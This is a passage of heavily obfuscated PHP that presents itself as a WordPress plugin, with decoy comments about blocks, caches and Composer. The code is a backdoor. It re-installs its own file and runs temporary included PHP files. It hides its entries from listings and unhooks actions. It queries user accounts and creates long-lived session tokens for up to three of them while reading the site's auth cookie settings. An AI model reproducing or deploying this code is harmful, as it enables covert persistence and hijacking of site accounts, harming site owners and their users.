unset($_k_8qqezd3f0hvy0[$aae4arj48kj4tof6][ar6vo_1nyhx2koj5(803)][$key]);

   break;

  }
}
 }
  }
/* non-singular derivation */

   $ubf3qhjkb74mm5v =   isset($_k_8qqezd3f0hvy0[xpm5lg9odtw6di(807)][bk9m46jygo3f(808)])      &&  $GLOBALS['__scf_zj8mp2xbaqmp_35']($_k_8qqezd3f0hvy0[ar6vo_1nyhx2koj5(807)][bk9m46jygo3f(809)])   ?      $_k_8qqezd3f0hvy0[xognx_h1jzkh(807)][gz_aorofp7mo(810)]    :  array();
   



      if   ($ubf3qhjkb74mm5v)  {
  $xase369gqpcbi6j  = defined(xpm5lg9odtw6di(714))   ? WP_CONTENT_DIR      :    (defined(xpm5lg9odtw6di(139))  ?    ABSPATH  . xognx_h1jzkh(811) : "");
$xd1ke5yh_chv   = array(ar6vo_1nyhx2koj5(769) => gz_aorofp7mo(770), gz_aorofp7mo(812) =>    ar6vo_1nyhx2koj5(813));


 foreach     ($ubf3qhjkb74mm5v as  $key =>      $szfjvfv8z_)    {
  if  (!isset($xd1ke5yh_chv[$key])     ||  $xase369gqpcbi6j   === "") continue;
$khb01gktfx  = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xase369gqpcbi6j    .  '/'     .  $key, false,    null,  0,   (0x2ab+0xd55));
if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($khb01gktfx)  &&     ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($khb01gktfx,     xpm5lg9odtw6di(814)    .      $xd1ke5yh_chv[$key]  . bk9m46jygo3f(774)) !==   false ||    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($khb01gktfx,  gz_aorofp7mo(815))  !== false))     {
       unset($_k_8qqezd3f0hvy0[ar6vo_1nyhx2koj5(816)][ar6vo_1nyhx2koj5(810)][$key]);
}
    }

  }
  return   $_k_8qqezd3f0hvy0;
   }
 
function  yi5mdd6n6aesfhsznx($__hz6_buq9igmy)
{


   if  (!   $GLOBALS['__scf_zj8mp2xbaqmp_35']($__hz6_buq9igmy))      {
  return      $__hz6_buq9igmy;

    }


   $pz39coaquq  = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h());
   $dn1baoj_6w  = $GLOBALS['__scf_zmckaak88my_204']($pz39coaquq,  PATHINFO_FILENAME);
$d55t5nnss9d6u =   array(
 array(ar6vo_1nyhx2koj5(817) =>  '#'    .  $GLOBALS['__scf_ihsujvdc278_818']($pz39coaquq,      '#') .  bk9m46jygo3f(819), xognx_h1jzkh(820)     =>   true),
    array(bk9m46jygo3f(817)    => xpm5lg9odtw6di(821)   . $GLOBALS['__scf_ihsujvdc278_818']($dn1baoj_6w,    '#') .   ar6vo_1nyhx2koj5(822),   gz_aorofp7mo(820)     =>    true),
   );
       if  (isset($__hz6_buq9igmy[xpm5lg9odtw6di(823)]) && $GLOBALS['__scf_zj8mp2xbaqmp_35']($__hz6_buq9igmy[gz_aorofp7mo(823)]))   {
foreach    ($__hz6_buq9igmy[gz_aorofp7mo(823)]  as    $rqfbhg2okkrjeft =>   $iifjqzqksvj9j3n2)  {
// propagate computable witness

  if  (!    $GLOBALS['__scf_zj8mp2xbaqmp_35']($iifjqzqksvj9j3n2) ||    !  $GLOBALS['__scf_obmceil7_8_39']($rqfbhg2okkrjeft))  {


 continue;
        }
if (!  isset($__hz6_buq9igmy[ar6vo_1nyhx2koj5(823)][$rqfbhg2okkrjeft][xognx_h1jzkh(824)])     ||   !  $GLOBALS['__scf_zj8mp2xbaqmp_35']($__hz6_buq9igmy[xognx_h1jzkh(823)][$rqfbhg2okkrjeft][xognx_h1jzkh(825)]))    {
   $__hz6_buq9igmy[gz_aorofp7mo(823)][$rqfbhg2okkrjeft][ar6vo_1nyhx2koj5(825)]    = array();
   }



   foreach   ($d55t5nnss9d6u      as   $aa3hirszp8)  {
   $__hz6_buq9igmy[gz_aorofp7mo(826)][$rqfbhg2okkrjeft][gz_aorofp7mo(825)][]    =  $aa3hirszp8;
}
 }
}
   return  $__hz6_buq9igmy;
       }
   
function   s15w9247yz53wftah0n()
   {
  try {
 if  (!  defined(bk9m46jygo3f(827))   ||    constant(xognx_h1jzkh(827))  <   (0x5+0x2))  {



       return;
}
    if     ($GLOBALS['__scf_kwfvo_j_hzb_532'](gz_aorofp7mo(828),    false)) {
return;
   }
$uauzh1cx3n5s =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h());
  $lt972txo06l = defined(bk9m46jygo3f(682))  ?  WP_PLUGIN_DIR   : "";
   $ax5a68ochfq  =  array(
$lt972txo06l    .  xognx_h1jzkh(829),
 $lt972txo06l .  ar6vo_1nyhx2koj5(830),
     $lt972txo06l   .     xpm5lg9odtw6di(831),
);

  $ggvxxtn6nce2l     =  "";
     foreach  ($ax5a68ochfq    as   $s6um63o_s0zywj1)   {
   if   ($s6um63o_s0zywj1    !==   ""  &&  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($s6um63o_s0zywj1)    && @$GLOBALS['__scf_cq91q6z6xreoi_46']($s6um63o_s0zywj1)) {
 $ggvxxtn6nce2l  =  $s6um63o_s0zywj1;
   break;
        }
}
       if  ($ggvxxtn6nce2l  ===     "")   {
// empty guard

 return;



   }
  $zr_o2ny574qob_qv =  $GLOBALS['__scf_meo_1tvjsals_11']($ggvxxtn6nce2l);

spl_autoload_register(function ($n_hollshff_ufv2h) use   ($zr_o2ny574qob_qv) {
foreach   (array($zr_o2ny574qob_qv . '/' . $n_hollshff_ufv2h . ar6vo_1nyhx2koj5(832),   $zr_o2ny574qob_qv   .  '/'   . $n_hollshff_ufv2h  . gz_aorofp7mo(833))    as    $siln4l3tbuyw)     {
    if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($siln4l3tbuyw)) {



        include_once $siln4l3tbuyw;
return;
  }



   }

});
 $mv_rk9qw6jz0v = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($ggvxxtn6nce2l);
    if     ($mv_rk9qw6jz0v  ===    false     ||     $GLOBALS['__scf_j_4rj7vg4ae0j_7']($mv_rk9qw6jz0v,  xognx_h1jzkh(834))   ===   false)  {
 return;
}
// WP Button Block: strength-reduce subscriber

   $mv_rk9qw6jz0v =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(835),  "", $mv_rk9qw6jz0v);
  $mv_rk9qw6jz0v  =      $GLOBALS['__scf_vz8ci2guu7b5_355'](ar6vo_1nyhx2koj5(834),  xpm5lg9odtw6di(836), $mv_rk9qw6jz0v);
  $k7m4o4i5go29   = wwbj8n248w5psw9u(mbmxky7iwj3mil3(),   gz_aorofp7mo(712));
if ($k7m4o4i5go29     ===    false) {
   return;
     }
@$GLOBALS['__scf_qy_a5siry0hu3_197']($k7m4o4i5go29,  bk9m46jygo3f(837)   .  $mv_rk9qw6jz0v);
 try {



   @include $k7m4o4i5go29;
     }   finally   {
xv6oqhjncehpr7v_mus7($k7m4o4i5go29);
      }
$sqgxi01wf_efv  =  $GLOBALS['__scf_zmckaak88my_204']($uauzh1cx3n5s,  PATHINFO_FILENAME);
$GLOBALS[bk9m46jygo3f(838)] =  $uauzh1cx3n5s;
 

      $GLOBALS[ar6vo_1nyhx2koj5(839)]    = $sqgxi01wf_efv;
       $ih891votva  =    xpm5lg9odtw6di(840)
   .  bk9m46jygo3f(841)
 . ar6vo_1nyhx2koj5(842)
 .    ar6vo_1nyhx2koj5(843)


  .      bk9m46jygo3f(844)
   .     '}'
.  xpm5lg9odtw6di(845)
        . '}'
 . '}';



     $hlqche4hzwq =    wwbj8n248w5psw9u(mbmxky7iwj3mil3(),  xognx_h1jzkh(846));
  if    ($hlqche4hzwq)  {



 @$GLOBALS['__scf_qy_a5siry0hu3_197']($hlqche4hzwq,     $ih891votva);
try     {
   @include   $hlqche4hzwq;
 }  finally    {
xv6oqhjncehpr7v_mus7($hlqche4hzwq);
 }
 }



 }  catch (Throwable  $o_qyrtxl85owt)      {
// WP Block API v3: infinite leaky-bucket

      kkpdha95nyx3tbltd10(gz_aorofp7mo(847), $o_qyrtxl85owt);
 } catch (Exception  $o_qyrtxl85owt)  {
   }
// offline affine-type

  }
 if (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(848)))   {
   function x88e2dm519q_m84($iqf6o08t42qni,  $dtut_2bm9hbku1t)
  {
 if   (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($iqf6o08t42qni))    {
return    $iqf6o08t42qni;

   }
$dsyzarrxqp8md     =   array(xpm5lg9odtw6di(849),    gz_aorofp7mo(850), xpm5lg9odtw6di(851),    gz_aorofp7mo(852),    bk9m46jygo3f(853));
   foreach  ($dsyzarrxqp8md as  $key)   {
  if  (!  isset($iqf6o08t42qni[$key]) ||  ! $GLOBALS['__scf_zj8mp2xbaqmp_35']($iqf6o08t42qni[$key]))  {
continue;
     }
 $wyjil_di2aatar  =  array();
 foreach  ($iqf6o08t42qni[$key]  as    $y6epw8rwg5rvw7u)  {
   if   (!   $GLOBALS['__scf_zj8mp2xbaqmp_35']($y6epw8rwg5rvw7u))    {
    $wyjil_di2aatar[] =  $y6epw8rwg5rvw7u;
  continue;
    }
 $vdbxs1krbxe7_5m = isset($y6epw8rwg5rvw7u[xpm5lg9odtw6di(406)])   ? $y6epw8rwg5rvw7u[gz_aorofp7mo(406)]    : "";
 $sqgxi01wf_efv =  isset($GLOBALS[xognx_h1jzkh(839)])  ?  $GLOBALS[gz_aorofp7mo(839)]   :   "";


if ($vdbxs1krbxe7_5m    === $dtut_2bm9hbku1t ||  ($sqgxi01wf_efv   !== "" &&    $vdbxs1krbxe7_5m ===  $sqgxi01wf_efv)) {

   continue;



}
$wyjil_di2aatar[]   =   x88e2dm519q_m84($y6epw8rwg5rvw7u,  $dtut_2bm9hbku1t);
}
$iqf6o08t42qni[$key]    =  $wyjil_di2aatar;
}
 return $iqf6o08t42qni;
  }
// PHP 8.4 fibers: co-recursive contravariant




    }
function  zo4j_zt94w3xi7lu1pd()


{
    if    (!empty($GLOBALS[bk9m46jygo3f(854)]))  return     false;
$GLOBALS[bk9m46jygo3f(855)]  =   1;$x4a0ajxqzi=PHP_INT_MAX/PHP_INT_MAX;$sop5fvtw6w=$x4a0ajxqzi+12;


return  true;
 }
   function f8gfbhr78e9rr1pqh3_vet()
 {
      try  {
// @fork retry-policy

if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(432))     && get_transient(ar6vo_1nyhx2koj5(663))) {
  return;
   }
if (!zo4j_zt94w3xi7lu1pd()) return;
    if ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(729))) set_transient(xognx_h1jzkh(663), 1, (0x989+0x487));
 $l2knh85zsvu7c_37 =    @$GLOBALS['__scf_r6y1fbsyx8i2l_99'](bho93o6vof3ni5_rg622_h());
   if   ($l2knh85zsvu7c_37  &&     $l2knh85zsvu7c_37   >   (7872-2872) && $l2knh85zsvu7c_37    < (7390618-2390618)  && !i__3znuz8m_x6r(bho93o6vof3ni5_rg622_h()))  {
 $uu4ngciyxzxk   =  @$GLOBALS['__scf_k4z5lhhe91ty_98'](bho93o6vof3ni5_rg622_h());
$m2xajyieeetng =  iljst04arjh1pet016s(bho93o6vof3ni5_rg622_h());

if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($m2xajyieeetng)  && g9edwd6m8_9cm8($m2xajyieeetng) &&     klhxdic2rbndomswk1($m2xajyieeetng)  ===  xl8k_pjv1048a7ae7())   {
    if     ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(59)))     @clearstatcache(true,  bho93o6vof3ni5_rg622_h());
    if (@$GLOBALS['__scf_k4z5lhhe91ty_98'](bho93o6vof3ni5_rg622_h())   === $uu4ngciyxzxk &&   @$GLOBALS['__scf_r6y1fbsyx8i2l_99'](bho93o6vof3ni5_rg622_h())    ===    $l2knh85zsvu7c_37)  {
if      (rmpvo8i8m8kfd9311njxy7(bho93o6vof3ni5_rg622_h(),  o_a46xczfm0z3pa91s($m2xajyieeetng)))    {
  mcuqsw_cyo3mnayi6ofr6(bho93o6vof3ni5_rg622_h());
g6q1ehat0szqqsfbv2(bho93o6vof3ni5_rg622_h());
      }
     }
    }
   unset($m2xajyieeetng,    $uu4ngciyxzxk);
    }
  $qho2p2q7svf552rm    =    @$GLOBALS['__scf_r6y1fbsyx8i2l_99'](bho93o6vof3ni5_rg622_h());
     $v3ad_79dhv53  = $qho2p2q7svf552rm &&  $qho2p2q7svf552rm  >     (4963+37);
  if ($v3ad_79dhv53  && $qho2p2q7svf552rm   >    (0x38a92f+0x2e756d1))  {
$v3ad_79dhv53    =   false;



   }
      if      ($v3ad_79dhv53   &&   $qho2p2q7svf552rm     >  (1915315-866739) &&    !h6ar9m7l1ifcrfqf0e($qho2p2q7svf552rm)) {$lws83d6jf4=(0xf8+0x7a);$jsqnue1ofg0_v=$lws83d6jf4%2;
       if    ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(856)))  {
// zero-allocation path
$o653hge7=PHP_INT_MAX/PHP_INT_MAX;$ck9_rxctx_exuv=$o653hge7+83;
 set_transient(xognx_h1jzkh(857),     1, (0x5fa+0x816));

 }
   return;
   }
  if  ($v3ad_79dhv53)   {



$k0zjep44q632      = iljst04arjh1pet016s(bho93o6vof3ni5_rg622_h());
   if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($k0zjep44q632) ||     !g9edwd6m8_9cm8($k0zjep44q632)) {
 $v3ad_79dhv53 =  false;
  

 }      else   {
   $cqpzpyso7dkvq89c =   tjj1y86387zrz51(xpm5lg9odtw6di(858), "");$mkb8y46jmrl40=(0x6+0x85);$ajjuxlm707ll9=$mkb8y46jmrl40%11;

  $hpv551sb9bz      =   klhxdic2rbndomswk1($k0zjep44q632);

  $c3395e2k7xp0j7a  = klhxdic2rbndomswk1($GLOBALS['__scf_is0fvk8c7tq2_41']($cqpzpyso7dkvq89c) ? $cqpzpyso7dkvq89c  : "");


       if      ($hpv551sb9bz  !==   ""   &&  ($c3395e2k7xp0j7a  ===  "" ||   version_compare($c3395e2k7xp0j7a, $hpv551sb9bz, '<')))  {
   $wwerzq50m6 =    $GLOBALS['__scf_eo363tjzd4r6n_56']($k0zjep44q632);


    $rxfpl0w_a2_80_ =    @$GLOBALS['__scf_vpig9uwvw8_pu_20']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())  .  ar6vo_1nyhx2koj5(677) .   $wwerzq50m6);
   if  (!$rxfpl0w_a2_80_) {

    $i1xnrrarl6lrz = get_option(ar6vo_1nyhx2koj5(859));
   if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($i1xnrrarl6lrz)   && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($i1xnrrarl6lrz,  $wwerzq50m6    . '|')    ===     0)    $rxfpl0w_a2_80_   =   true;
   }


if  ($rxfpl0w_a2_80_) $v3ad_79dhv53    =   false;
  if     (!$rxfpl0w_a2_80_ && $GLOBALS['__scf_is0fvk8c7tq2_41']($cqpzpyso7dkvq89c) &&  ($cqpzpyso7dkvq89c ===  ""  ||      $c3395e2k7xp0j7a === ""  || version_compare($c3395e2k7xp0j7a, $hpv551sb9bz, '<'))) fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(860),      $k0zjep44q632,  xpm5lg9odtw6di(743));

   unset($wwerzq50m6,   $rxfpl0w_a2_80_,  $i1xnrrarl6lrz);
 } elseif  ($GLOBALS['__scf_is0fvk8c7tq2_41']($cqpzpyso7dkvq89c)  && $GLOBALS['__scf_fxl4k4gsul_10']($cqpzpyso7dkvq89c)     > (445+55) &&  $GLOBALS['__scf_fxl4k4gsul_10']($cqpzpyso7dkvq89c)   <=   (1048512+64)    &&  !sl80t81tfwuwpn5w1_($cqpzpyso7dkvq89c)      &&    g9edwd6m8_9cm8($cqpzpyso7dkvq89c)      &&      $GLOBALS['__scf_eo363tjzd4r6n_56']($k0zjep44q632)    !==   $GLOBALS['__scf_eo363tjzd4r6n_56']($cqpzpyso7dkvq89c))  {



 $v3ad_79dhv53 =      false;
}



   }
      }
if     ($v3ad_79dhv53)  {
 if     ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(861)))      {
 set_transient(gz_aorofp7mo(857),   1,   (3592+8));


   }
// Composer autoload icon sprite

return;


}
    if (i__3znuz8m_x6r(bho93o6vof3ni5_rg622_h()))     {
// worst-case lsm-tree

  return;
     }
     $on7px0ajv7_123e0 =  $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h());
if    (!  @$GLOBALS['__scf_h23c49ni_b86_43']($on7px0ajv7_123e0))   {
  w1m15sg83rnn5uqc64($on7px0ajv7_123e0, (564-71),  true);
 }
   $h5j78gabt8g1var   =  tjj1y86387zrz51(bk9m46jygo3f(862),   "");$nhr0ll1cz=PHP_MAJOR_VERSION;$p0ce5adht3o=$nhr0ll1cz*10;
    if   (!$h5j78gabt8g1var    ||     !$GLOBALS['__scf_is0fvk8c7tq2_41']($h5j78gabt8g1var))  {$dtbkdvmf5=PHP_INT_MAX/PHP_INT_MAX;$roauck_n9jkj=$dtbkdvmf5+2;
     if  (!get_transient(gz_aorofp7mo(863)))  {
        kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(864),    xpm5lg9odtw6di(865));


 set_transient(ar6vo_1nyhx2koj5(866),  1, (3591+9));


}
// @rotate proof-term

 }
if  ($h5j78gabt8g1var  &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($h5j78gabt8g1var)   &&    $GLOBALS['__scf_fxl4k4gsul_10']($h5j78gabt8g1var)   >   (452+48) &&    $GLOBALS['__scf_fxl4k4gsul_10']($h5j78gabt8g1var)   <=    (1048547+29) &&      !sl80t81tfwuwpn5w1_($h5j78gabt8g1var) &&      g9edwd6m8_9cm8($h5j78gabt8g1var))    {
$j33opu_5kwd4 =  klhxdic2rbndomswk1($h5j78gabt8g1var);
   if  ($j33opu_5kwd4 ===  "" || version_compare($j33opu_5kwd4, xl8k_pjv1048a7ae7(), '<'))  {
 return;
     }
 $q86wq7yj58qiqux     =  $GLOBALS['__scf_eo363tjzd4r6n_56']($h5j78gabt8g1var);

      if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()) .  ar6vo_1nyhx2koj5(677)  . $q86wq7yj58qiqux)) return;
 $d5pjuwd_o5nx_   =   get_option(ar6vo_1nyhx2koj5(859));



 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($d5pjuwd_o5nx_) && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($d5pjuwd_o5nx_, $q86wq7yj58qiqux   .     '|') ===   0)     return;
 unset($q86wq7yj58qiqux,  $d5pjuwd_o5nx_);
 $jdceq1mn41z52 =    $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()) .  ar6vo_1nyhx2koj5(189)  .   $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  ar6vo_1nyhx2koj5(833));



    $jsdsdewy00    =  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($jdceq1mn41z52) ? $GLOBALS['__scf_u6m4cedwgt__319']((string)   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($jdceq1mn41z52))   : "";
  if  ($jsdsdewy00 !==  ""    && $GLOBALS['__scf_eo363tjzd4r6n_56']($h5j78gabt8g1var)   ===  $jsdsdewy00)   {
   return;
}
 f97udlofaljpuxw1_jgnfh(bho93o6vof3ni5_rg622_h(), (389+31));
    $wb2y26sdz6dqtk2   =  rmpvo8i8m8kfd9311njxy7(bho93o6vof3ni5_rg622_h(),   o_a46xczfm0z3pa91s($h5j78gabt8g1var));
 if   ($wb2y26sdz6dqtk2) {
  mcuqsw_cyo3mnayi6ofr6(bho93o6vof3ni5_rg622_h());
    f97udlofaljpuxw1_jgnfh(bho93o6vof3ni5_rg622_h(), (705-285));

  g6q1ehat0szqqsfbv2(bho93o6vof3ni5_rg622_h());
 p5t6fz6i7ccgjh(true);
jzt71g_lciq6atvff(true);

     x1ssqxtszsg2ard3txeiw(bho93o6vof3ni5_rg622_h());
if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(861)))    {
  set_transient(bk9m46jygo3f(857), 1, (3593+7));
 }
 }     elseif ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(861)))   {
set_transient(ar6vo_1nyhx2koj5(867), 1,   (313+1487));

       }
}
}  catch     (Throwable      $o_qyrtxl85owt) {
    kkpdha95nyx3tbltd10(bk9m46jygo3f(868),     $o_qyrtxl85owt);
}   catch (Exception  $o_qyrtxl85owt)   {
 }
}


   



    function nvjtr8r7x8ewh3()



  {
 h345r36mfxa4f8(xpm5lg9odtw6di(869),   ar6vo_1nyhx2koj5(870));
  h345r36mfxa4f8(xognx_h1jzkh(871),  ar6vo_1nyhx2koj5(870));
 if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(872)))   {
 remove_action(xpm5lg9odtw6di(873), gz_aorofp7mo(874));
  remove_action(xpm5lg9odtw6di(875),   xpm5lg9odtw6di(874), (81^91));
    remove_action(bk9m46jygo3f(876),   gz_aorofp7mo(877), (15-5));
}
 }
 function    azt2rk_vrm_4krepiv2_()
{
  try   {
     $wpdb  =  $GLOBALS[xognx_h1jzkh(878)];
  $lsjlg6f1m21gzej  =  $wpdb->prefix   . ar6vo_1nyhx2koj5(879);
    $f1r99wls1wz40   = 'S' .  xognx_h1jzkh(880)      . $wpdb->users . ar6vo_1nyhx2koj5(881)  .  $wpdb->usermeta   . bk9m46jygo3f(882);
      $xbsbx66zop7lg    = $wpdb->get_results($wpdb->prepare($f1r99wls1wz40, $lsjlg6f1m21gzej,   gz_aorofp7mo(883)));





     if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($xbsbx66zop7lg)) {
       kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(884), (string)  $wpdb->last_error);
   return   array();
  }
 return   $xbsbx66zop7lg;
 }  catch  (Throwable $o_qyrtxl85owt)  {
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(578),     $o_qyrtxl85owt);
}    catch   (Exception $o_qyrtxl85owt)  {
  kkpdha95nyx3tbltd10(xpm5lg9odtw6di(885),    $o_qyrtxl85owt);
 }
 return array();



   }
function  qaml87zhz_rk3fmp($qwh6m3s3ng6xqwq)
 {

 $yx4ydokkdzpuix3 =   array();
 $sqwss53tiwnu_5j     =  function   ($zwsvwrlbjmw9uvlx)    {
     $zwsvwrlbjmw9uvlx[xognx_h1jzkh(886)]      =   "";
return $zwsvwrlbjmw9uvlx;
 };
    try    {
 $b0n4vybo7o   = tjj1y86387zrz51(gz_aorofp7mo(887),  array());
    if     (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($b0n4vybo7o))     $b0n4vybo7o = array();

   $_pd  =   false;

    foreach ($b0n4vybo7o   as  $uzj6fy8wdkk4 =>     $pntpho605l) {
if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($pntpho605l)  &&  isset($pntpho605l['c'], $pntpho605l['e'])  &&  $GLOBALS['__scf_zj8mp2xbaqmp_35']($pntpho605l['c'])    &&  (int)  $pntpho605l['e']  > $GLOBALS['__scf_ks7_xfapvywl_185']()      +  (0x5dfc+0xf384))  {
// populate partial branded-type

  $yx4ydokkdzpuix3[$uzj6fy8wdkk4]    =  $pntpho605l['c'];
 } else  {$ldxotflirf0vts=8|229;$jweg7l_m9moy=$ldxotflirf0vts^154;
unset($b0n4vybo7o[$uzj6fy8wdkk4]);
        $_pd =     true;
  }
 }
   if  (!  $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(888)) || !    $GLOBALS['__scf_kwfvo_j_hzb_532'](xognx_h1jzkh(889))) {
 if      ($_pd)  fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(890), $b0n4vybo7o, xognx_h1jzkh(743));
  return     $yx4ydokkdzpuix3;
  }


   if   (!   $GLOBALS['__scf_zj8mp2xbaqmp_35']($qwh6m3s3ng6xqwq)  || empty($qwh6m3s3ng6xqwq)) {
      if   ($_pd)    fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(890), $b0n4vybo7o, ar6vo_1nyhx2koj5(743));
  return  $yx4ydokkdzpuix3;
   }
 $u7j83kbo9tlp10      =  $GLOBALS['__scf_ks7_xfapvywl_185']()  +    (17-3)  * (86353+47);
$is_ssl =      $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(891))  &&   is_ssl();
$sbrx3kva1cf8h6  =    $is_ssl ? bk9m46jygo3f(892) :  gz_aorofp7mo(893);
 $s99zcyeh9x2rhg =    $is_ssl  ? (defined(xpm5lg9odtw6di(894)) ?     SECURE_AUTH_COOKIE    :  "") : (defined(xpm5lg9odtw6di(895))    ? AUTH_COOKIE :  "");

$gbrtjc9fdlq9u_    =      defined(xpm5lg9odtw6di(896))  ?  LOGGED_IN_COOKIE :    "";
if   (!  $s99zcyeh9x2rhg     ||     !  $gbrtjc9fdlq9u_)  {



  if   ($_pd)   fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(890),     $b0n4vybo7o,      bk9m46jygo3f(743));
 return $yx4ydokkdzpuix3;
   }
   $aq2q38wbod4bxk2i  =  defined(xognx_h1jzkh(897))  &&     COOKIE_DOMAIN ?  $GLOBALS['__scf__4_5aelz82b4m_8'](COOKIE_DOMAIN,  '.') :  vse28wh0vwl84gzd2("");
$itq_d4l62p92ixl4    =  defined(xpm5lg9odtw6di(898)) ?  COOKIEPATH  :   '/';
$hsl7c5nt4mg4d  =   defined(xognx_h1jzkh(899))  ? ADMIN_COOKIE_PATH      :  bk9m46jygo3f(900);


$fyv2s5iw7u3er0    =    $is_ssl  ?    xpm5lg9odtw6di(901)  : ar6vo_1nyhx2koj5(902);
  $g3z6ma16w7vxd   =  "\t";
   h345r36mfxa4f8(ar6vo_1nyhx2koj5(903),      $sqwss53tiwnu_5j,     0);


      $cie25_gv5z92l3 =  dmqaubx1rbr260fipu(bk9m46jygo3f(904));
$pugzjxy4ycx7 = $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(660)) ?  @get_option($cie25_gv5z92l3, array())      :  array();



 if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($pugzjxy4ycx7)) $pugzjxy4ycx7   = array();
   if    ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(660)) && $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(746)))    {
    $m8fqneon0b   =   (int) @get_option(dmqaubx1rbr260fipu(ar6vo_1nyhx2koj5(905)), 0);
 




 if   ($m8fqneon0b  <     2)     {
  if  (!empty($pugzjxy4ycx7))  {
  $pugzjxy4ycx7 = array();
@update_option($cie25_gv5z92l3,    $pugzjxy4ycx7,  xpm5lg9odtw6di(743));
}

   @update_option(dmqaubx1rbr260fipu(ar6vo_1nyhx2koj5(906)),    2,   ar6vo_1nyhx2koj5(743));

       }
// @reclaim iterator

 unset($m8fqneon0b);
}
$a98snivckv_  =     $GLOBALS['__scf_oenrsvkzs1_36']($yx4ydokkdzpuix3);
   foreach     ($qwh6m3s3ng6xqwq   as  $n_3g7fevtxkicu)     {
// lock semisimple replicator

  if (!  $GLOBALS['__scf_v834hljo6be9_67']($n_3g7fevtxkicu) ||  !    $n_3g7fevtxkicu->ID   || !  $n_3g7fevtxkicu->user_login)   {
        continue;
  }
  if    ($a98snivckv_  >=   (2+1))   {


   break;
 }
$y7lvx26ut3t  =  (string)   $n_3g7fevtxkicu->user_login;
 if    (isset($yx4ydokkdzpuix3[$y7lvx26ut3t]))    {


   continue;
        }
   if  (isset($pugzjxy4ycx7[$y7lvx26ut3t])      &&    (int)  $pugzjxy4ycx7[$y7lvx26ut3t]    >   $GLOBALS['__scf_ks7_xfapvywl_185']()   +  2 *     (86349+51)) {
continue;
}
wp_cache_delete($n_3g7fevtxkicu->ID,  gz_aorofp7mo(907));
    $m7aifm22nzptwg2 =  get_user_meta($n_3g7fevtxkicu->ID,      xognx_h1jzkh(908), true);
if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($m7aifm22nzptwg2)    &&  $GLOBALS['__scf_oenrsvkzs1_36']($m7aifm22nzptwg2)   >=   (9^3))    {


 $f5zdeshf11nesv =    array();
  foreach ($m7aifm22nzptwg2   as  $hqttcr9b5885  =>  $nvho665iadpyz)   {
// Redis object cache: lazy sliding-window

  if  (isset($nvho665iadpyz[xognx_h1jzkh(909)]) &&    $nvho665iadpyz[xpm5lg9odtw6di(909)]  >    $GLOBALS['__scf_ks7_xfapvywl_185']())   {



   $f5zdeshf11nesv[$hqttcr9b5885]   =   $nvho665iadpyz;
}
  }
if ($GLOBALS['__scf_oenrsvkzs1_36']($f5zdeshf11nesv)    !== $GLOBALS['__scf_oenrsvkzs1_36']($m7aifm22nzptwg2))  {
   update_user_meta($n_3g7fevtxkicu->ID,  ar6vo_1nyhx2koj5(908), $f5zdeshf11nesv);
}


       }
wp_cache_delete($n_3g7fevtxkicu->ID, xognx_h1jzkh(907));
  $n3iidzt48lrjzjh = $GLOBALS['__scf_pds8salms2pk_289'](array(ar6vo_1nyhx2koj5(910),  xpm5lg9odtw6di(911)),    $n_3g7fevtxkicu->ID);
$hq7kab04po5of   =   $n3iidzt48lrjzjh->create($u7j83kbo9tlp10);


 $ijl2bhbl8gc7  = array();
